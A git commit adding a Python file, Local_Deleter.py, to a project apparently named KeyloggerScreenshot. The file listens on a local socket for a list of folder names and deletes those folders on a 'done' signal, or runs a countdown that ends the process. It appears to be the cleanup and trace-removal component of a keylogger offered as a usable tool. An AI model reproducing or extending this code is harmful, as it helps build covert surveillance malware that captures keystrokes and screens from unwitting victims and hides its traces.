3b65df725791e1d7dd6b5d51dfb2b4a99e0e5a6c
Fawaz <106278241+Kill0geR@users.noreply.github.com>
2023-04-27 08:03:27 +0200

    Create Local_Deleter.py

---
+++ KeyloggerScreenshot/Local_Deleter.py
@@ -0,0 +1,50 @@
+import os
+import socket
+import ast
+import time
+import threading
+
+
+class DeleteList:
+    lst = None
+
+    @staticmethod
+    def countdown(seconds):
+        seconds += 15
+        minutes = seconds // 60
+        # Calculates the floor
+        false_second = minutes * 60
+        exact_seconds = seconds - false_second
+
+        while seconds:
+            time.sleep(1)
+            seconds -= 1
+        os._exit(0)
+
+    @staticmethod
+    def start():
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.bind(("127.0.0.1", 1077))
+        server.listen(5)
+        while True:
+            client_socket, ipaddress = server.accept()
+
+            full_msg = ""
+            while True:
+                msg = client_socket.recv(20).decode()
+                if len(msg) <= 0: break
+                full_msg += msg
+
+            if "[" in full_msg:
+                DeleteList.lst = ast.literal_eval(full_msg)
+
+            elif full_msg == "done":
+                if DeleteList.lst:
+                    os.chdir("..")
+                    for idx, each in enumerate(DeleteList.lst):
+                        os.rmdir(each)
+                os._exit(0)
+
+            else:
+                threading_lst = threading.Thread(target=DeleteList.countdown, args=(int(full_msg), ))
+                threading_lst.start()
